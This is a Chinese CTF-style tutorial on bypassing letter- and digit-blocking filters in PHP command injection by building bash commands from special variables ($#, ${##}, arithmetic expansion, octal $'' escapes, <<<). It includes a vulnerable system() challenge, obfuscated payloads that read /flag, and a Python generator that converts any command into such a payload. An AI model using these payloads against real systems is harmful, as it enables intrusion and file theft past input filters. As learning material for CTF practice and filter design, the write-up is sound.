+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in 12.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$x</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z0-9;`|#&#x27;\&quot;%&amp;\x09\x0a&gt;&lt;.,?*\-=\\[\]]/i&quot;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat &quot;</span>.<span class="variable">$x</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>正好对应这个知识点，构造如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">刚刚好我在学习时构造出了11，这里直接利用</span><br><span class="line">11+1=12 ： $(($((~$(($((~$(())))$((~$(())))))))+$(($((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))))))))))</span><br></pre></td></tr></table></figure>
+
+<p>刚好这里没有禁+号，直接抓包后传进去即可</p>
+<h3 id="利用shell脚本变量构造命令"><a href="#利用shell脚本变量构造命令" class="headerlink" title="利用shell脚本变量构造命令"></a>利用shell脚本变量构造命令</h3><p>这个思路最早提出于2017年34c3CTF里的<a target="_blank" rel="noopener" href="https://medium.com/@orik_/34c3-ctf-minbashmaxfun-writeup-4470b596df60">minbashmaxfun</a>，随后2020安洵杯也有<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12242?time__1311=mqmhD5YIMD7GkDlc+EvPQqOQbDkDfg2TD&alichlgref=https://www.bing.com/#toc-2">Web-Bash-Vino0o0o</a></p>
+<p><strong>探姬师傅有个项目应该是可以尝试一把梭的</strong>，好文好项目推送：<code>https://github.com/ProbiusOfficial/bashFuck?tab=readme-ov-file</code></p>
+<p>还有bash的参考手册：<code>https://www.gnu.org/software/bash/manual/bash.html</code></p>
+<h4 id="启程"><a href="#启程" class="headerlink" title="启程"></a>启程</h4><p>这一板块去跟一下最早的<a target="_blank" rel="noopener" href="https://medium.com/@orik_/34c3-ctf-minbashmaxfun-writeup-4470b596df60">文章</a>。</p>
+<p><strong>这道题允许的字符串<code>$()#!&#123;&#125;&lt;\’,</code></strong></p>
+<p>这里说明一下相关变量：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">（1）$# -参数数量-单独使用结果为0</span><br><span class="line">（2）$&#123;##&#125; -计数变量（#）长度，这里的结果为1</span><br><span class="line">（3）$((expr)) -算术表达式</span><br><span class="line">（4）&lt;&lt;&lt; -这是Bash shell语言中的重定向符，将一个变量或者字符串重定向到命令的标准输入（即wc -w &lt;&lt;&lt; &quot;H&quot;等价于echo &quot;H&quot; | wc -w）</span><br><span class="line">（5）$&#123;!var&#125; -间接引用</span><br><span class="line">（6）$&#x27;\123&#x27; -将八进制转换为字符串文字中的字符</span><br><span class="line">（7）&#123;a,b&#125; -花括号扩展</span><br></pre></td></tr></table></figure>
+
+<p><strong>这里补充说明一下</strong>：</p>
+<ul>
+<li>对（5）的间接引用的说明，直接给shell测试代码：</li>
+</ul>
+<p>haha.sh:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">var1=&quot;hello&quot;</span><br><span class="line">var2=&quot;var1&quot;</span><br><span class="line">echo $&#123;!var2&#125;</span><br></pre></td></tr></table></figure>
+
+<p>再运行：</p>
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603023300478.png" alt="image-20240603023300478"></p>
+<p>可以看到这里输出的是hello，这就是间接引用的定义。</p>
+<ul>
+<li>对（6）的补充说明，如下：</li>
+</ul>
+<p>一个小小的前置知识，看完理解一下就行。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls ==》 $&#x27;\154&#x27;$&#x27;\163&#x27; 这样是可以直接使用的</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603153444204.png" alt="image-20240603153444204"></p>
+<p>就是<code>$&#39;&#39;</code>会直接执行生成，所以交给编译器的是ls，也就会执行。</p>
+<p><strong>再进行组合运用一下：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$(($&#123;##&#125;&lt;&lt;$&#123;##&#125;)) - 1左移1，结果为2 位运算，与二进制的运算相关</span><br><span class="line">$&#123;!#&#125; - 执行 bash（因为第一个参数是 /bin/bash），可以在本地输出看看</span><br><span class="line">$((2#100)) -将二进制转换为十进制</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="开始构造"><a href="#开始构造" class="headerlink" title="开始构造"></a>开始构造</h5><p>先尝试<code>ls</code>，**<code>l</code>对应八进制为0154，<code>s</code>对应的八进制为0163。**</p>
+<p><strong>先用八进制表示，<code>$&#39;\154&#39;$&#39;\163&#39;</code>,个人发现<code>$&#39;\154\163&#39;</code>也可以表示<code>ls</code>，</strong>这里先跟文章，然后再尝试自己构造发现的同样表示ls的方法。</p>
+<p>注意组合运用那里<code>$((2#100))</code>可以将二进制100转换为十进制数4，采用这个思路来构造出整数，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">154二进制数 : 0b10011010</span><br><span class="line">163二进制数 : 0b10100011</span><br></pre></td></tr></table></figure>
+
+<p>那么现在就用<code>$#</code>（0）和<code>$</code>（1）来替换里面的数字，如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">154二进制数 ：$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#</span><br><span class="line">163二进制数 ：$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这样就可以构造出二进制的数。</p>
+<p>那么此时就需要构造出前面的2，<strong>此时再看组合运用那里</strong>，<code>$(($&lt;&lt;$))</code>这样不就构造出2了吗，最终效果如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">154：$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))</span><br><span class="line">同理</span><br><span class="line">163：$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))</span><br></pre></td></tr></table></figure>
+
+<p>这时再套入<code>$&#39;&#39;</code>，即（<code>$&#39;\154&#39;$&#39;\163&#39;</code>），如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">先看正常包裹：</span><br><span class="line">$&#x27;\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))&#x27;$&#x27;\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))&#x27;</span><br><span class="line">这样并不能成功，请注意。估计就是套外面的特殊符号被当作字符串从而转义了，这里就需要在特殊符号前面加一个\防止被转义。</span><br><span class="line">那么再次尝试如下：</span><br><span class="line">\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))\&#x27;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))\&#x27;</span><br><span class="line">输出看看</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603125450576.png" alt="image-20240603125450576"></p>
+<p>但是注意，这个构造出来的<code>$&#39;\154&#39;$&#39;\163&#39;</code><strong>只会被当做字符串，并不会被当作命令执行再次执行从而形成ls</strong>，也就是说这里的<code>$&#39;&#39;</code>并没有起作用，本来它可以自己执行从而生成ls的，为什么不继续解析可以看看这个<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/361101.html">文章</a>，可以在终端直接传，结果如下：<br><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603125825756.png" alt="image-20240603125825756"></p>
+<p>显示没有这个命令，那么此时我们就需要将这个传入bash使得这个被解析为<code>ls</code>，<strong>这次就可以利用到<code>&lt;&lt;&lt;</code>这个重定向符</strong>，如下格式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash &lt;&lt;&lt; \$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))\&#x27;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))\&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>这样就可以成功构造出ls，再传入的时候就可以被执行，但是这道题这里要求无字母，此时就<strong>可以用到间接扩展<code>$0</code>，单独使用在linux中对应bash</strong>，但是这道题不能有数字，看组合运用那里，就可以像这样：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;!#&#125; &lt;&lt;&lt; \$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))\&#x27;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))\&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>很怪的就是本地测试当中<code>bash&lt;&lt;&lt;.....</code>可以执行，但是<code>$0</code>和<code>$&#123;!#&#125;</code>都不能成功执行，报错如下：</p>
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603135658082.png" alt="image-20240603135658082"></p>
+<p><strong>怪？？？，怎么回事，可能是宝塔linux环境的问题吧，多尝试，注意看题目要求。</strong></p>
+<p>这里再用centos跑一下：</p>
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603204933409.png" alt="image-20240603204933409"></p>
+<p>成功，这样就可以构造出没有数字字母的<code>ls</code>的payload了。</p>
+<p><strong>那么继续深入</strong>，比如读flag（<code>cat /flag</code>）或者查看根目录（<code>ls /</code>），<strong>尝试直接利用</strong>一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls / ==&gt; $&#x27;\154\163\40\57&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603141433189.png" alt="image-20240603141433189"></p>
+<p>注意看，这里构造出来后被<code>ls /</code>被当作了整个字符串处理，而不是命令，这是怎么回事，<strong>这是因为<code>bash</code>是用空格分隔参数，这个方法（<code>$&#39;&#39;</code>）处理完的结果会导致整个结果都被当做了字符串（包括这里的空格）</strong>，这就导致了不能被正常解析为命令。解决方法如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">要先给bash来参数分离一下，</span><br><span class="line">bash &lt;&lt;&lt; $&#x27;\154\163\40\57&#x27;   </span><br><span class="line">即可成功执行，还有问题的话就如这种格式尝试&#123;ls,/&#125;，注意&#123;ls,/&#125;也不能像之前ls那样直接利用，与ls /同样的问题。</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>再来看看文章的问题</strong></p>
+<p>在传入时有效的做到了以下几点：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash&lt;&lt;&lt;&quot;&#x27;ls -l&#x27;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>却报错</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash: line 1: ls -l: command not found</span><br></pre></td></tr></table></figure>
+
+<p>看到这里我测试了一下，如下传参是可以执行的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash&lt;&lt;&lt;&quot;ls /&quot;</span><br></pre></td></tr></table></figure>
+
+<p>我就在想为什么要这样在里面套一对单引号，本来以为是多此一举，想了一下，可能是构造出来的payload在转化完后就是这样的，事实胜于雄辩，直接构造一下看看结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ls /  ：$&#x27;\154\163\40\57&#x27;  这次这样构造一下</span><br><span class="line">相对应的二进制数为：0b10011010，0b10100011，0b101000 和 0b111001</span><br><span class="line">分别为 $&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$# $&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125; $&#123;##&#125;$#$&#123;##&#125;$#$#$# $&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$#$#$&#123;##&#125;</span><br><span class="line">再二进制转十进制，如下：</span><br><span class="line">2:   $(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))</span><br><span class="line">154: $(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))</span><br><span class="line">163: $(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))</span><br><span class="line">40:  $(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#))</span><br><span class="line">57:  $(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$#$#$&#123;##&#125;))</span><br></pre></td></tr></table></figure>
+
+<p>那么现在如下构造：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">先完成最前面提出的问题，试试$&#x27;\154\163&#x27;能不能使用，如下：</span><br><span class="line">\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))\&#x27;</span><br><span class="line">结合前面的问题，如下测试：</span><br><span class="line">bash&lt;&lt;&lt;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))\&#x27;  成功执行ls</span><br><span class="line"></span><br><span class="line">同时注意bash&lt;&lt;&lt;&quot;&#x27;ls&#x27;&quot; 也是可以执行的</span><br></pre></td></tr></table></figure>
+
+<p>这里说明了<code>$&#39;\154&#39;$&#39;\163&#39;</code>,个人发现的<code>$&#39;\154\163&#39;</code>都是可用的，虽然本来就是一样的。</p>
+<p>现在回到原先的问题，刚好证明了，这里使用更简单的构造，如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash &lt;&lt;&lt; $&#x27;\154\163\40\57&#x27;</span><br><span class="line">bash&lt;&lt;&lt;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$#$#$&#123;##&#125;))\&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603150736801.png" alt="image-20240603150736801"></p>
+<p>这个事实就可以充分地说明在这个构造方法中最终利用的payload确实是如文章所说：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash&lt;&lt;&lt;&quot;&#x27;ls /&#x27;&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>那现在就继续跟文章</strong></p>
+<p>而出现这个结果的原因应该还是字符串问题，<strong>这阻止了<code>bash</code>用空格分隔参数，</strong></p>
+<p>我们只需使用上述方法运行<code>bash -c</code>，并将最终命令作为参数。这样，<strong>第二次 bash 调用就会进行参数分离</strong>。</p>
+<p>为了在<code>bash</code>和之间放置空格字符<code>-c</code>，我们使用括号扩展：<code>&#123;bash,-c&#125;</code>。这会扩展为带有空格的字符串。</p>
+<p>最终构造地paylaod：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash&lt;&lt;&lt;&#123;bash，-c，ls -l&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>那么发散一下，也就是再调用一下bash嘛，那么我尝试再用一次<code>&lt;&lt;&lt;</code>呢</strong>，如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash &lt;&lt;&lt;bash\&lt;\&lt;\&lt;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$#$&#123;##&#125;$&#123;##&#125;$#$&#123;##&#125;$#))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#$&#123;##&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$#$&#123;##&#125;$#$#$#))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$#$#$&#123;##&#125;))\&#x27;</span><br><span class="line">注意防止转义</span><br></pre></td></tr></table></figure>
+
+<p>成功执行，<strong>同时注意主要还是用这个</strong></p>
+<h4 id="其它的利用"><a href="#其它的利用" class="headerlink" title="其它的利用"></a>其它的利用</h4><p>其他的博主由此也提出了新的利用方法，参考<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12242?time__1311=mqmhD5YIMD7GkDlc+EvPQqOQbDkDfg2TD&alichlgref=https://www.bing.com/#toc-1">文章</a></p>
+<h5 id="shell脚本中-的多种用法"><a href="#shell脚本中-的多种用法" class="headerlink" title="shell脚本中$的多种用法"></a>shell脚本中$的多种用法</h5><p>shell脚本中<code>$</code>的多种用法（例子可参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/ly_qiu/article/details/105765772">文章</a>）：</p>
+<table>
+<thead>
+<tr>
+<th>变量名</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>$0</td>
+<td>脚本本身的名字</td>
+</tr>
+<tr>
+<td>$1</td>
+<td>脚本后所输入的第一串字符</td>
+</tr>
+<tr>
+<td>$2</td>
+<td>传递给该shell脚本的第二个参数</td>
+</tr>
+<tr>
+<td>$*</td>
+<td>脚本后所输入的所有字符</td>
+</tr>
+<tr>
+<td>$@</td>
+<td>脚本后所输入的所有字符</td>
+</tr>
+<tr>
+<td>$_</td>
+<td>表示上一个命令的最后一个参数</td>
+</tr>
+<tr>
+<td>$#</td>
+<td>#脚本后所输入的字符串个数</td>
+</tr>
+<tr>
+<td>$$</td>
+<td>脚本运行的当前进程ID号</td>
+</tr>
+<tr>
+<td>$!</td>
+<td>表示最后执行的后台命令的PID</td>
+</tr>
+<tr>
+<td>$?</td>
+<td>显示最后命令的退出状态，0表示没有错误，其他表示有错误</td>
+</tr>
+</tbody></table>
+<h5 id="利用-构造"><a href="#利用-构造" class="headerlink" title="利用$#构造"></a>利用<code>$#</code>构造</h5><p>本质就是和上面启程部分说的那个一样，但是有可能<code>$&#123;!#&#125;</code>这种复杂变量不能通过php的system函数解析出来，可以将其换一种形式：</p>
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603165448778.png" alt="image-20240603165448778"></p>
+<p>加了变量$__作为过渡，减少了解析的过程。</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /flag</span><br><span class="line">__=$&#123;#&#125;;$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\&lt;\&lt;\&lt;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;##&#125;$&#123;#&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;#&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;##&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;##&#125;$&#123;#&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;##&#125;))\&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>可以使用的脚本:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;__=$&#123;#&#125;;$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">        payload+=<span class="string">f&#x27;\\\\$(($((1&lt;&lt;1))#<span class="subst">&#123;<span class="built_in">bin</span>(<span class="built_in">int</span>(<span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]))[<span class="number">2</span>:]&#125;</span>))&#x27;</span>.replace(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;$&#123;##&#125;&#x27;</span>).replace(<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;$&#123;#&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload+=<span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure>
+
+<h5 id="利用-构造-1"><a href="#利用-构造-1" class="headerlink" title="利用 $(()) 构造"></a>利用 $(()) 构造</h5><p>这个刚刚好上面记录到有这个吗，可以使用<code>$(())</code>来构造任意数字</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0： $(())</span><br><span class="line">-1: $((~$(())))</span><br><span class="line">1:  $((~$((~$(($(())))$((~$(())))))))    </span><br><span class="line">2:  $(($((~$((~$(($(())))$((~$(())))))))&lt;&lt;$((~$((~$(($(())))$((~$(())))))))))     1&lt;&lt;1</span><br><span class="line">2：  $((~$(($((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure>
+
+<p>自己尝试按照<code>$#</code>那种方法来构造，比如ls</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$&#x27;\154\163&#x27;</span><br><span class="line"></span><br><span class="line">154二进制数 : 0b10011010</span><br><span class="line">163二进制数 : 0b10100011</span><br><span class="line"></span><br><span class="line">相对应的： $((~$((~$(($(())))$((~$(())))))))$(())$(())$((~$((~$(($(())))$((~$(())))))))$((~$((~$(($(())))$((~$(())))))))$(())$((~$((~$(($(())))$((~$(())))))))$(())</span><br><span class="line"></span><br><span class="line">$((~$((~$(($(())))$((~$(())))))))$(())$((~$((~$(($(())))$((~$(())))))))$(())$(())$(())$((~$((~$(($(())))$((~$(())))))))$((~$((~$(($(())))$((~$(())))))))</span><br></pre></td></tr></table></figure>
+
+<p>在终端输出看一下，均成功构造。不要构造了，到后面的加入<code>#</code>运用是错的，但还是可以自己去构造着试试。</p>
